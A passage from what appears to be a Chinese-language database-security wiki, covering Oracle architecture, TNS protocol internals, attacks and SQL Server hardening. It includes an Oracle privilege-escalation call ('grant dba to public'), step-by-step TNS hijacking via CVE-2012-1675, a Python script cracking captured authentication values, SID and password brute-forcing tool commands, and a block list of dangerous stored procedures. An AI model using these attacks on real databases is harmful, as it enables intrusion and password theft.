VARCHAR2, LANGUAGE_FLAG IN INTEGER) IS 包是PUBLIC属性，只要能连接到数据库就能调用 调用者权限 想办法绕过调用者权限 1.高权限用户sys，定义一个名为A的public属性的具有定义者权限的过程，并调用了DBMS_SQL.PARSE接口，此接口存在一个参数能传入一个动态字符串并执行sql。 2.低权限soctt用户执行public属性的A过程，虽然报错但是执行成功。 3.提权成功。 2.4.3 漏洞成因危险的定义者权限 危险的public执行权限 禁止执行任意SQL语句 加强用户的身份识别 例子：在9i中ctxsys是DBA账户 1ctxsys.driload.validate_stmt(&#x27;grant dba to public&#x27;); 10g后把这个包的创建者ctxsys权限从DBA中移除了 2.5 PL/SQL 注入防护建议DBMS_SQL.PARSE()最后调用ICD_PARSE，未传入了USERID DBMS_SQL.PARSE_AS_USER()最后调用ICD_PARSE，传入了USERID 所以建议使用DBMS_SQL.PARSE_AS_USER() ​","tags":[{"name":"Oracle Database","slug":"Oracle-Database","permalink":"http://example.com/tags/Oracle-Database/"}],"categories":[{"name":"数据库安全","slug":"数据库安全","permalink":"http://example.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/"},{"name":"Oracle Database","slug":"数据库安全/Oracle-Database","permalink":"http://example.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle-Database/"}]},{"title":"Oracle Database简单概述","date":"2021-07-03T02:59:15.000Z","path":"wiki/数据库安全/Oracle Database/Oracle-Database简单概述/","text":"[TOC] Oracle 数据库体系结构 分为两个大部分： RDBMS 关系数据库管理系统控制文件（.ctl） 数据文件（.dbf） 日志文件（.log） SGA：系统全局区，主要包括： 共享池：用于存储最近定义的sql语句和数据定义。 Oracle使用最近最少使用(LRU，leastrecentlyused)算法来管理可用空间。 1）数据块缓存区数据块缓存区(datablockbuffercache)是SGA中的一个高速缓存区域，用来存储从数据库中读取数据段的数据块(如表、索引和簇)。数据块缓存区的大小由数据库服务器init.ora文件中的DB_LOCK_BUFFERS参数决定(用数据库块的个数表示)。在调整和管理数据库时，调整数据块缓存区的大小是一个重要的部分。 2）字典缓存区数据库对象的信息存储在数据字典表中，这些信息包括用户帐号数据、数据文件名、段名、盘区位置、表说明和权限，当数据库需要这些信息(如检查用户查询一个表的授权)时，将读取数据字典表并且将返回的数据存储在字典缓存区的SGA中。 3）重做日志缓冲区重做项描述对数据库进行的修改。它们写到联机重做日志文件中，以便在数据库恢复过程中用于向前滚动操作。然而，在被写入联机重做日志文件之前，事务首先被记录在称作重做日志缓冲区(redologbuffer)的SGA中。数据库可以周期地分批向联机重做日志文件中写重做项的内容，从而优化这个操作。重做日志缓冲区的大小(以字节为单位)由init.ora文件中的LOG_BUFFER参数决定。 4）SQL共享池SQL共享池存储数据字典缓存区及库缓存区(librarycache)，即对数据库进行操作的语句信息。当数据块缓冲区和字典缓存区能够共享数据库用户间的结构及数据信息时，库缓存区允许共享常用的SQL语句。 SQL共享池包括执行计划及运行数据库的SQL语句的语法分析树。在第二次运行(由任何用户)相同的SQL语句时，可以利用SQL共享池中可用的语法分析信息来加快执行速度。 SQL共享池通过LRU算法来管理。当SQL共享池填满时，将从库缓存区中删掉最近最少使用的执行路径和语法分析树，以便为新的条目腾出空间。如果SQL共享池太小，语句将被连续不断地再装入到库缓存区，从而影响操作性能。 SQL共享池的大小(以字节为单位)由init.ora文件参数SHARED_POOL_SIZE决定。 5）大池大池(LargePool)是一个可选内存区。如果使用线程服务器选项或频繁执行备份/恢复操作，只要创建一个大池，就可以更有效地管理这些操作。大池将致力于支持SQL大型命令。利用大池，就可以防止这些SQL大型命令把条目重写入SQL共享池中，从而减少再装入到库缓存区中的语句数量。大池的大小(以字节为单位)通过init.ora文件的LARGE_POOL_SIZE参数设置，用户可以使用init.ora文件的LARGE_POOL_MIN_ALLOC参数设置大池中的最小位置。Oracle8i已不用这个参数。作为使用LargePool的一种选择方案，可以用init.ora文件的SHARED_POOL_RESERVED_SIZE参数为SQL大型语句保留一部分SQL共享池。 6）Java池由其名字可知，Java池为Java命令提供语法分析。Java池的大小(以字节为单位)通过在Oracle引入的init.ora文件的JAVA_POOL_SIZE参数设置。init.ora文件的JAVA_POOL_SIZE参数缺省设置为10MB。 7）多缓冲池可以在SGA中创建多个缓冲池，能够用多个缓冲池把大数据集与其他的应用程序分开，以减少它们争夺数据块缓存区内相同资源的可能性。对于创建的每一个缓冲池，都要规定其LRU锁存器的大小和数量。缓冲区的数量必须至少比LRU锁存器的数量多50倍。 创建缓冲池时，需要规定保存区(keeparea)的大小和再循环区(recyclearea)的大小。与SQL共享池的保留区一样，保存区保持条目，而再循环区则被频繁地再循环使用。可以通过BUFFER_POOL_KEEP参数规定来保存区的大小。例如：保存和再循环缓冲池的容量减少了数据块缓冲存储区中的可用空间(通过DB_BLOCK_BUFFERS参数设置)。对于使用一个新缓冲池的表，通过表的storage子句中的buffer_pool参数来规定缓冲池的名字。例如，如果需要从内存中快速删除一个表，就把它赋予RECYCLE池。缺省池叫作DEFAULT，这样就能在以后用altertable命令把一个表转移到DEFAULT池。 PGA：为用户进程保留的空间，即服务器进程。 后台进程： • 数据库写进程(DBWn) ​ 负责将数据库缓冲区高速缓存中经过修改的缓冲区（脏数据缓冲区）写入磁盘。在一个数据库实例中，DBWn进程最多可以启动36个，进程名分别为DBWn0、DBWn1、DBWn2、…DBWnj。 ​ 注：LRU（Least Recently Used，最近最少使用）：数据缓冲的一种管理机制，只保留最近数据，不保留旧数据。 ​ 注：DIRTY：表示“脏列”或者“弄脏了的数据”，实际上就是指被修改但是还没有写入数据文件的数据。 ​ 通过命令可以来了解参数信息 1show parameter db_writer_processes; ​ DBWn进程最多可以启动20个，所以DB_WRITER_PROCESSES参数的取值范围是1-36。 • 日志写进程(LGWR) ​ 负责管理日志缓冲区的一个后台进程，用于将日志缓冲区中的日志数据写入磁盘的日志文件中 ​ 在数据库运行时，对数据库的修改操作将被记录到日志信息中，这些日志信息首先保存在日志缓冲区，当日志信息达到一定量时，由LGWR进程将日志数据写入日志文件。 ​ 需要LGWR进程将缓冲区数据中的日志数据写入磁盘的主要情况有如下几种： 用户进程提交（commit）事务 日志缓冲区池已满1/3 出现超时（每隔3秒） DBWn进程调用磁盘写入进程 • 检查点进程(CKPT) 一般在发生日志切换时产生。在系统运行过程中，当需要将修改后的数据写回数据文件并且产生日志切换时就会产生检查点。检查点保证所有修改过的数据库缓冲区中的数据都被写入磁盘数据文件中。 在Oracle数据库中，提供了两个参数控制检查点的产生：一个是LOG_CHECKPOINT_TIMEOUT,用来设置检查点产生的时间间隔；另一个是LOG_CHECKPOINT_INTERVAL,用来设置一个检查点需要填充的日志文件块的数目也就是每产生多少个日志数据，自动产生一个检查点。 ​ 通过以下命令了解log_checkpoint_timeout参数信息： 1show parameter log_checkpoint_timeout; ​ log_checkpoint_timeout参数默认值为1800，单位为秒。 ​ 通过以下命令可以了解log_checkpoint_interval 参数值： 1show parameter log_checkpoint_interval; ​ log_checkpoint_interval参数值默认为0。 • 系统监视器进程(SMON) ​ 在实例启动时执行实例恢复，并负责清理不再使用的临时段。在具有并行服务器选项的环境下，SMON进程对有故障的CPU或者实例进行实例恢复。SMON进程被有规律的唤醒，检查是否需要使用，其他进程需要时也可以调用次进程。（可被hacker调用） ​ 实例恢复： • 进程监视器进程(PMON) ​ 用于在用户进程出现故障时执行进程恢复操作，并负责清理内存存储区和释放该进程所用的资源。改进程周期性的检查调度进程和服务器进程的状态，如果发现进程已死，则重新启动它。PMON进程被有规律的唤醒，检查是否需要使用，其他进程需要使用时也可以调用此进程。（可被hacker调用） • 归档进程(ARCn) • 恢复器进程(RECO) • 封锁进程(LCKn) • 调度进程(Dnnn) • 快照进程(SNPn) • 作业队列协调程序(CJQ0) • 作业从属进程(Jnnn) • 队列监视器进程(QMNn) TNS监听服务​ TNS监听是攻击的重点 TNS协议结构TNS 包由一个header和payload 组成 123456780 8 16 31+--------------+--------------+| Packet Length| Packet Chksm | +------+-------+--------------+ 8 byte header| Type | Rsrvd | Header Chksm | +------+-------+--------------+| P A Y L O A D |+-----------------------------+ 通用Header8个字节： Length 2 包的长度，包括通用包头 Packet check sum 2 包的校验和 Type 1 TNS类型 Flag 1 状态 Header check sum 2 通用头的校验和 注： ​ Length：包长度（包括包头） ​ Type： 数据包的类型 类型号 类型说明 1 0x01 连接（CONNECT） 2 0x02 接受（ACCEPT） 3 0x03 确认（ACK） 4 0x04 拒绝（REFUTE） 5 0x05 重定向（REDIRECT） 6 0x06 数据（DATA） 7 0x07 NULL 8 0x08 9 0x09 中止（ABORT） 10 0x0a 11 0x0b 重新发送（RESEND） 12 0x0c 标记（MARKER） 13 0x0d ATTENTION 14 0x0e 控制（CONTROL） payload： Connect 连接类型数据如下所示： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748Transparent Network Substrate Protocol Packet Length: 254 Packet Checksum: 0x0000 Packet Type: Connect (1) Reserved Byte: 00 Header Checksum: 0x0000 Connect Version: 313 Version (Compatible): 300 Service Options: 0x0000 Session Data Unit Size: 2048 Maximum Transmission Data Unit Size: 32767 NT Protocol Characteristics: 0xc60e Line Turnaround Value: 0 Value of 1 in Hardware: 0100 Length of Connect Data: 196 Offset to Connect Data: 58 Maximum Receivable Connect Data: 512 Connect Flags 0: 0x61 Connect Flags 1: 0x61 Trace Cross Facility Item 1: 0x00000000 Trace Cross Facility Item 2: 0x00000000 Trace Unique Connection ID: 0x0000000000000000 Connect Data: (DESCRIPTION=(CONNECT_DATA=(SERVICE_NAME=ORCL)(CID=(PROGRAM= C:\\oracle\\product\\10.2.0\\client_1\\bin\\sqlplus.exe) (HOST=WINXPSP2)(USER=vmware)))(ADDRESS=(PROTOCOL=TCP) (HOST=192.168.1.102)(PORT=1521))) 0.018134 192.168.1.108 192.168.1.102 TNS Request, Connect (1), Connect 0000 00 0c 29 0c 9a c7 00 0c 29 fd 07 3d 08 00 45 00 ..).....)..=..E. 0010 01 26 05 0b 40 00 80 06 70 a4 c0 a8 01 6c c0 a8 .&amp;..@...p....l.. 0020 01 66 04 66 05 f1 ac 94 a7 3e 66 d2 7e ee 50 18 .f.f.....&gt;f.~.P. 0030 ff ff 15 91 00 00 00 fe 00 00 01 00 00 00 01 39 ...............9 0040 01 2c 00 00 08 00 7f ff c6 0e 00 00 01 00 00 c4 .,.............. 0050 00 3a 00 00 02 00 61 61 00 00 00 00 00 00 00 00 .:....aa........ 0060 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0070 28 44 45 53 43 52 49 50 54 49 4f 4e 3d 28 43 4f (DESCRIPTION=(CO 0080 4e 4e 45 43 54 5f 44 41 54 41 3d 28 53 45 52 56 NNECT_DATA=(SERV 0090 49 43 45 5f 4e 41 4d 45 3d 4f 52 43 4c 29 28 43 ICE_NAME=ORCL)(C 00a0 49 44 3d 28 50 52 4f 47 52 41 4d 3d 43 3a 5c 6f ID=(PROGRAM=C:\\o 00b0 72 61 63 6c 65 5c 70 72 6f 64 75 63 74 5c 31 30 racle\\product\\10 00c0 2e 32 2e 30 5c 63 6c 69 65 6e 74 5f 31 5c 62 69 .2.0\\client_1\\bi 00d0 6e 5c 73 71 6c 70 6c 75 73 2e 65 78 65 29 28 48 n\\sqlplus.exe)(H 00e0 4f 53 54 3d 57 49 4e 58 50 53 50 32 29 28 55 53 OST=WINXPSP2)(US 00f0 45 52 3d 76 6d 77 61 72 65 29 29 29 28 41 44 44 ER=vmware)))(ADD 0100 52 45 53 53 3d 28 50 52 4f 54 4f 43 4f 4c 3d 54 RESS=(PROTOCOL=T 0110 43 50 29 28 48 4f 53 54 3d 31 39 32 2e 31 36 38 CP)(HOST=192.168 0120 2e 31 2e 31 30 32 29 28 50 4f 52 54 3d 31 35 32 .1.102)(PORT=152 0130 31 29 29 29 1))) Accept接收类型数据如下所示： 12345678910111213141516171819202122Transparent Network Substrate Protocol Packet Length: 32 Packet Checksum: 0x0000 Packet Type: Accept (2) Reserved Byte: 04 Header Checksum: 0x0000 Accept Version: 312 Service Options: 0x0000 Session Data Unit Size: 2048 Maximum Transmission Data Unit Size: 32767 Value of 1 in Hardware: 0100 Accept Data Length: 0 Offset to Accept Data: 32 Connect Flags 0: 0x61 Connect Flags 1: 0x61 00 0c 29 fd 07 3d 00 0c 29 0c 9a c7 08 00 45 00 ..)..=..).....E. 00 48 7c cf 40 00 80 06 f9 bd c0 a8 01 66 c0 a8 .H|.@........f.. 01 6c 11 d9 04 67 b6 88 7a 22 0e a7 cb 81 50 18 .l...g..z&quot;....P. ff 01 1d 97 00 00 00 20 00 00 02 04 00 00 01 38 ....... .......8 00 00 08 00 7f ff 01 00 00 00 00 20 61 61 00 00 ........... aa.. 00 00 00 00 00 00 ...... Refuse拒绝类型数据如下所示： 12345678910110.047753 192.168.1.102 192.168.1.108 TNS Response, Refuse (4), Refuse 00 0c 29 fd 07 3d 00 0c 29 0c 9a c7 08 00 45 00 ..)..=..).....E. 00 8f 53 e2 40 00 80 06 22 64 c0 a8 01 66 c0 a8 ..S.@...&quot;d...f.. 01 6c 05 f1 04 0d e8 a0 2d 2b 67 0d 99 85 50 18 .l......-+g...P. fe ff 59 03 00 00 00 67 00 00 04 00 00 00 22 00 ..Y....g......&quot;. 00 5b 28 44 45 53 43 52 49 50 54 49 4f 4e 3d 28 .[(DESCRIPTION=( 54 4d 50 3d 29 28 56 53 4e 4e 55 4d 3d 31 35 33 TMP=)(VSNNUM=153 30 39 32 33 35 32 29 28 45 52 52 3d 31 32 35 31 092352)(ERR=1251 34 29 28 45 52 52 4f 52 5f 53 54 41 43 4b 3d 28 4)(ERROR_STACK=( 45 52 52 4f 52 3d 28 43 4f 44 45 3d 31 32 35 31 ERROR=(CODE=1251 34 29 28 45 4d 46 49 3d 34 29 29 29 29 4)(EMFI=4)))) ​ DATA 包是类型6，包括2个字节的 flag 标志位，1字节的 packet id，可选的 TTI id，还有数据本身。 1234560 16 24 31+-----------+----+-----+| Data Flag | ID |&lt;TTI&gt;|+----------------------+| D A T A |+----------------------+ 字段说明： Data Flag: 数据标识 ID： 包ID TTI: TTI(Two-Task Interface) ID DATA: 有效数据 Data Flag 通常是 0x0000， 当所有数据发送完毕指示文件结尾，值为 0x0040 下面是列出了有效的数据包ID: ID 描述 0x01 协议协商。下面这些标识是可以接受的协议版本：0x06 0x05 0x04 0x03 0x02 0x01 0x00 0x02 交换数据类型 0x08 “OK”服务器给客户端的响应 0x11 TTI (Two-Task Interface)功能扩展 0x20 使用外部的程序和服务注册 0xdeadbeef 附加网络选项，客户端可协商附加连接熟悉，例如：认证，加密，数据完整性，监控。注意：wireshark 中叫这个包为 Secure Network Services Oracle Database TNS 漏洞TNS劫持​ 知道目标物理地址和端口，本地搭建同名数据库，通过远程注册目标机器的TNS下同名实例 ​ CVE-2012-1675漏洞是Oracle允许攻击者在不提供用户名/密码的情况下，向远程“TNS Listener”组件处理的数据投毒的漏洞。攻击者可利用此漏洞将数据库服务器的合法“TNS Listener”组件中的数据转向到攻击者控制的系统，导致控制远程组件的数据库实例，造成组件和合法数据库之间的中间人攻击、会话劫持或拒绝服务攻击。 ​ CVE-2012-3137漏洞是Oracle Database 10g/11g身份验证协议实现中存在一个设计缺陷，攻击者无需认证即可远程获取数据库用户密码哈希相关数据，从而可以离线暴力破解用户密码，进一步控制数据库系统。 我们通过如下的步骤和过程可以实现对Oracle的入侵： 123456（1）利用CVE-2012-1675进行TNS劫持，在监听下利用远程注册，注册同名数据库实例；（2）新登陆的用户，在TNS的负载均衡策略下，有可能流量登录到伪造的监听服务上；（3）该监听服务对用户的登陆过程进行监控，并将相关数据流量转发到真实的数据库上；（4）利用CVE-2012-3137获得通讯过程中的认证相关信息；（5）对认证相关信息进行离线的暴力破解，获得登陆的密码；（6）试用破解的用户名/密码登陆Oracle，完成对Oracle中数据的访问； 下面是一段可用的TNS劫持的过程： 1.在劫持机上创建一个和目标数据库实例同名的数据库实例。 2.在劫持机上修改 tnsnames.ora 文件 1234添加listener_name= (DESCRIPTION= (ADDRESS=(PROTOCOL=tcp)(HOST=目标机器IP)(PORT=目标机器端口))) 3.在劫持机上用SQLPlus 顺序执行下面步骤。 123456789客户端向TNS 侦听器发送一个“数据包”（TNS_TYPE_DATA = 6），其中包含以下数据： 1.要注册的服务名称。 2.以指定的服务名称注册的实例。 3.允许的最大客户端连接数。 4.当前建立的客户端连接数。 5.处理程序的名称。 6.连接数据库的IP地址和端口。 1231.$ sqlplus / as sysdba2. SQL&gt; ALTER SYSTEM SETREMOTE_LISTENER=&#x27;LISTENER_NAME&#x27;;3. SQL&gt; ALTER SYSTEM REGISTER; 4.多个客户端，向数据库发起登录。会劫持到一部分客户端的登录信息。 ​ 按照猜想同一个监听下有2个同名实例。客户端访问监听，监听按照客户端中的数据库名信息分配数据库，由于监听下有2个同名数据库，客户端链接很可能会被分配到劫持者的数据库实例下，再通过配置劫持者的本地监听把客户端请求指回原数据库。 ​ 通过以上方式我们可以截获约一半左右客户端发送到服务器的合法链接。其中获得了服务器IP、端口号、数据库位置、实例名、登录用户名等一系列明文信息和4组密文信息（AUTH_SESSKEY，AUTH_SESSKEY_CLIENT，AUTH_PASSWORD，AUTH_VFR_DATA）。 ​ 通过CVE-2012-3137进行密码破解 CVE-2012-3137受影响的数据库版本有11.2.0.3，11.2.0.2，11.1.0.7,有使用了SHA-1加密算法的10.2.0.5和10.2.0.4，还有使用了SHA-1的10.2.0.3（运行在z/OS下）版本。 ​ 确认加密方式之后，数据库用户被O3logon（oracle验证方式） 进行验证，这个协议执行一个序列来向数据库证明客户端拥有密码。为了避免网络第三方截获到密码。首先客户端发送用户名到数据库来表明用户身份。数据库端根据加密协议，其中96位的作为数据库端密钥，20位的作为偏移量，它对每个连接都是不同的。一个典型的数据库端发给客户端的密钥如下： 1AUTH_SESSKEY.....COCDD89FIGODKWASDF…………………… ​ 客户端根据加密算法向服务器端发送96位的客户端密钥和64位的密码密钥。服务器端计算客户端传入的密码密钥。如果计算后密码密文和数据库中存储的16位密码密文一致则验证通过。 ​ 这个过程可知上面TNS劫持包中取得的加密信息：AUTH_SESSKEY，AUTH_SESSKEY_CLIENT，AUTH_PASSWORD，AUTH_VFR_DATA这四个值是解密的关键。我们把他们按照SHA1,MD5，AES192进行一系列处理。最终通过数据字典碰撞得到密码明文。 import hashlib from Crypto.Cipher import AES def decrypt(session,salt,password): pass_hash= hashlib.sha1(password+salt) key =pass_hash.digest() + &#39;\\x00\\x00\\x00\\x00&#39; decryptor= AES.new(key,AES.MODE_CBC) plain =decryptor.decrypt(session) return plain session_hex =&#39;EA2043CB8B46E3864311C68BDC161F8CA170363C1E6F57F3EBC6435F541A8239B6DBA16EAAB5422553A7598143E78767&#39; salt_hex = &#39;A7193E546377EC56639E&#39; passwords = [&#39;test&#39;,&#39;password&#39;,&#39;oracle&#39;,&#39;demo&#39;] for password in passwords: session_id= decrypt(session_hex.decode(&#39;hex&#39;),salt_hex.decode(&#39;hex&#39;),password) print&#39;Decrypted session_id for password &quot;%s&quot; is %s&#39; %(password,session_id.encode(&#39;hex&#39;)) if session_id[40:] == &#39;\\x08\\x08\\x08\\x08\\x08\\x08\\x08\\x08&#39;: print&#39;PASSWORD IS &quot;%s&quot;&#39; % password break TNS缓冲区溢出ORACLE调用系统用户做认证 CVE-2002-0965 SERVICE_NAME值超过20字节，导致溢出。 Oracle Database SQL注入漏洞一、直接sql语句 ​ 第二个请求有用户名和密文口令，下面有名称值对列表，描述客户端的属性，这部分可替换成任何sql语句，在sys环境执行。登录数据库时就可以创建用户。 二、PL/SQL语言 匿名块：单次调用 命名块：有名称，存储在服务器，可多次调用 1234DECLAREBEGINEXCEPTIONEND 变量的作用 在DECLARE阶段声明 每一行只能声明一个变量 声明标识符不能超过30字符，第一个字符为字母，不分大小写，不能用 -，不能用保留字，不能和引用的列同名，列名的优先级别高于变量。 PL/SQL变量： 复合变量：数组、记录、PL/SQL表 非PL/SQL变量 Oracle 数据库评估工具sidguesser​ 基于字典的SID爆破工具 Oracle 数据库实例名称SID 一个数据库服务器可以创建多个数据库实例 SID是数据访问的入口 ​ Oracle是一个大型的数据库管理系统，在一台Oracle服务器上，我们可以为不同的应用创建各自独立的数据库实例。为了方便管理和访问不同的数据库实例，操作系统通过SID来识别不同的数据库。作为渗透测试者，发现库实例的SID是实现数据访问的第一步。sidguesser是一个基于字典的SID枚举工具，帮助渗透测试者发现数据访问的入口。 ​ 使用 1sidguess -i IP -d dict.txt oscanner​ oscanner是一款针对oracle数据库服务器进行安全评估的框架软件，功能包括SID、身份信息、密码策略、用户角色权限等的爆破和枚举检查。由于此工具内建字典过于简陋，因此要想发挥应有的作用，我们必须手动完善字典内容。 Java开发的Oracle安全评估框架 基于插件、字典的架构 SID枚举 密码爆破 Oracle版本枚举 账号角色枚举 账号权限枚举 审计信息枚举 密码策略枚举（自己配置密码字典，默认密码字典太简单） 数据库链接枚举 ​ 配置文件 123456/usr/share/oscanner/default.conf/usr/share/oscanner/diftionary.txt/usr/share/oscanner/users.txt/usr/share/oscanner/service.txt/usr/share/oscanner/oracleplugins.default/usr/share/oscanner/accounts.default 1oscanner -s server -f serverlist -P 1521 tnscmd10g​ Oracle数据库管理系统默认的服务端口是TCP 1521。在早期版本的Oracle系统中，通过对此端口的探测，可以获得大量系统信息，这给渗透测提供了有利的前提。tnscmd10g 主要针对7-9版本的Oracle数据库服务器，进行应用和操作系统层面的信息收集。同时也可以利用漏洞，直接输入并执行系统指令，上传和启动后门程序。10g以后版本的Oracle数据库大大提升了系统的安全性，使得本工具效果受限。 针对Oracle 7-9i的信息收集工具 向TNS监听程序发送指令（TCP 1521） 爆破SID 1tnscmd10g verssion -h 192.168.1.1","tags":[{"name":"Oracle Database","slug":"Oracle-Database","permalink":"http://example.com/tags/Oracle-Database/"}],"categories":[{"name":"数据库安全","slug":"数据库安全","permalink":"http://example.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/"},{"name":"Oracle Database","slug":"数据库安全/Oracle-Database","permalink":"http://example.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle-Database/"}]},{"title":"SQL Server数据库安全加固","date":"2021-07-03T02:34:50.000Z","path":"wiki/数据库安全/SQL Server/SQL-Server数据库安全加固/","text":"SQL Server加固账号管理查询目前所有用户列表 1select name,password from syslogins order by name 为不同的管理员分配不同的账号 按照使用目的进行分配账号，避免不同用户间共享账号，提高安全性。或在企业管理器中直接添加远程登陆用户建立角色，并给角色授权，把角色赋给不同的用户或修改用户属性中的角色和权限。 添加不同用户，参考配置操作： 12sp_addlogin &#x27;user1&#x27;,&#x27;password1&#x27;sp_addlogin &#x27;user2&#x27;,&#x27;password2&#x27; 删除或锁定无效账号 删除冗余的系统默认账号，减少系统安全隐患，参考配置操作。 1Microsoft SQL Server Management Studio -&gt; SQL Server -&gt; 安全性 -&gt; 登录名 -&gt; 选择要删除的用户名（右键） 限制启动账号权限 启动mssql的用户权限过高，会导致其子进程具有相同权限，参考配置操作： 1Microsoft SQL Server Management Studio -&gt; SQL Server -&gt;属性(右键) -&gt; 安全性 新建SQL server服务账号后，建议将其从User组中删除，且不要把该账号提升为Administrators组的成员，授予以账户最少启动权限。 认证授权 权限最小化 在数据库权限配置能力内，根据用户的业务需要，配置其所需的最小权限，参考配置操作： 1Microsoft SQL Server Management Studio -&gt; SQL Server -&gt; 属性(右键) -&gt; 安全性 数据库角色 使用数据库角色（ROLE）来管理对象的权限，参考配置操作： 1Microsoft SQL Server Management Studio -&gt; SQL Server -&gt; 安全性 -&gt; 服务器角色（右键）-&gt; 新服务器角色 调整角色属性中的权限，赋予角色中拥有对象对应的SELECT、INSERT、UPDATE、DELETE、EXEC、DRI权限 是否存在空密码用户 对所有账户的属性进行审计，包括空密码、密码更新时间等。修改目前所有账号的口令，确认为强口令。特别是sa 账号。 12select * from sysusers select name,Password from syslogins where password is null order by name # 查看口令为空的用户 使用sp_password更新用户密码，特别是sa 账号，需要设置至少10位的强口令。 1exec sp_password &#x27;old_passwd&#x27;, &#x27;new_passwd&#x27;, sa 锁定特权 默认情况下，SQL Server安装会在模型数据库之外的所有数据库中授予guest帐户公共角色成员身份。 建议在Windows中禁用guest帐户，并撤消其对除master和tempdb之外的所有数据库的访问权限。参考配置操作，使用以下命令删除数据库访问权限 12use msdb;exec sp_revokedbaccess guest; Public不应访问Web任务表，因为它们可以使表数据可供Web客户端使用。 特权应被撤销： 12revoke update on mswebtasks to publicrevoke insert on mswebtasks to public Microsoft数据转换服务（DTS）程序包是一组COM接口，可用于在SQL Server上使用以下命令执行许多管理任务：T-SQL，Windows脚本和可执行工具。 默认情况下，企业管理器用户可以访问可用DTS软件包列表。 过程sp_enum_ dtspackages将显示可以输入到sp_get_dtspackage中的软件包名称和ID号，这将返回软件包数据。 然后，攻击者可能会将程序包放入他的SQL Server本地安装中，并查看程序包详细信息，其中通常包含其他服务器的凭据。 这些程序的特权应被删除： 12revoke execute on sp_enum_dtspackages to publicrevoke execute on sp_get_dtspackage to public sp_get_SQLAgent_properties存储过程，用于显示SQL Server代理服务连接到数据库服务器的混淆密码。 使用此工具（http://jimmers.narod.ru/agent_pwd.c）可以解混淆。 应删除此程序的权限： 1revoke execute on sp_get_SQLAgent_properties to public Microsoft数据转换服务（DTS）用于处理来自多个源（例如OLE DB，ODBC或文本文件）的数据。 连接密码以明文形式保存在Col11120列的表RTblDBMProps中，因此任何具有选择特权的人都可以检索到。 使用以下命令锁定此表的权限： 1234revoke select on RTblDBMProps to publicrevoke update on RTblDBMProps to publicrevoke insert on RTblDBMProps to publicrevoke delete on RTblDBMProps to public 配置日志审计开启日志审计功能 数据库应配置日志功能，对用户登录进行审计，日志内容包括用户登录使用的账号、登录是否成功、登录时间等。 打开数据库属性，查看安全性，将服务器身份验证调整为“SQL Server 和Windows身份验证模式” ，安全性中的登录审核调整为“失败和成功的登录”。 1Microsoft SQL Server Management Studio -&gt; SQL Server（右键） -&gt; 属性 -&gt; 安全性 或者通过将以下注册表值设置为2（将其设置为3还将记录成功的登录）： 1HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSSQLServer\\MSSQLServer\\AuditLevel 配置网络通信协议禁用不必要的网络服务 SQL Server使用的网络通信协议应限制为最小基础架构所需。 禁用SQL Server运行冗余服务。 启用陌生的网络通信协议，可能增加数据库网络风险。TCP/IP是最常用的用于SQL Server的网络协议栈，它与SSL一起为访问SQL Server提供安全的基础。 Microsoft SQL Server程序组, 运行服务网络实用工具。建议只使用TCP/IP协议，禁用其他协议。 1SQL Server Configuration Manager -&gt; SQL Server网络配置 -&gt; MSSQLSERVER的协议 加固TCP/IP协议栈 查看注册表键值 123HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters\\DisableIPSourceRoutingHKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\EnableICMPRedirectHKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters\\SynAttackProtect 参考配置操作 对于TCP/IP协议栈的加固主要是某些注册表键值的修改。主要是以下几个： 1HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters\\DisableIPSourceRouting #说明：该键值应设为2，以防御源路由欺骗攻击。HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\EnableICMPRedirect #说明：该键值应设为0，以ICMP重定向。HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters\\SynAttackProtect #说明：该键值应设为2，防御SYN FLOOD攻击。 使用加密通讯协议 启动SQL Server配置工具，启用“强制协议加密”。 1SQL Server Configuration Manager -&gt; SQL Server网络配置 -&gt; MSSQLSERVER的协议（右键） -&gt; 属性 删除不必要的存储过程查询已有的所有的存储过程 1select * from sysobjects where xtype=&#x27;P&#x27; 或者 1Microsoft SQL Server Management Studio -&gt; SQL Server -&gt; 数据库 -&gt; 系统数据库 -&gt; master（举例）-&gt; 可编程性 -&gt; 存储过程/扩展存储过程 -&gt; 系统存储过程/系统扩展存储过程 ​ 删除SQL Server中存在的危险存储过程： 12345678910111213141516171819202122exec sp_dropextendedproc &#x27;xp_cmdshell&#x27; exec sp_dropextendedproc &#x27;xp_dirtree&#x27;exec sp_dropextendedproc &#x27;xp_enumgroups&#x27;exec sp_dropextendedproc &#x27;xp_fixeddrives&#x27;exec sp_dropextendedproc &#x27;xp_loginconfig&#x27;exec sp_dropextendedproc &#x27;xp_enumerrorlogs&#x27;exec sp_dropextendedproc &#x27;xp_getfiledetails&#x27;exec sp_dropextendedproc &#x27;Sp_OACreate&#x27; exec sp_dropextendedproc &#x27;Sp_OADestroy&#x27; exec sp_dropextendedproc &#x27;Sp_OAGetErrorInfo&#x27; exec sp_dropextendedproc &#x27;Sp_OAGetProperty&#x27; exec sp_dropextendedproc &#x27;Sp_OAMethod&#x27; exec sp_dropextendedproc &#x27;Sp_OASetProperty&#x27; exec sp_dropextendedproc &#x27;Sp_OAStop&#x27; exec sp_dropextendedproc &#x27;Xp_regaddmultistring&#x27; exec sp_dropextendedproc &#x27;Xp_regdeletekey&#x27; exec sp_dropextendedproc &#x27;Xp_regdeletevalue&#x27; exec sp_dropextendedproc &#x27;Xp_regenumvalues&#x27; exec sp_dropextendedproc &#x27;Xp_regread&#x27; exec sp_dropextendedproc &#x27;Xp_regremovemultistring&#x27; exec sp_dropextendedproc &#x27;Xp_regwrite&#x27; drop procedure sp_makewebtask 删除不必要的存储过程，一般情况下建议删除的存储过程有： 123456789101112sp_OACreate sp_OADestroy sp_OAGetErrorInfo sp_OAGetProperty sp_OAMethod sp_OASetProperty sp_OAStop sp_regaddmultistring xp_regdeletekey xp_regdeletevalue xp_regenumvalues 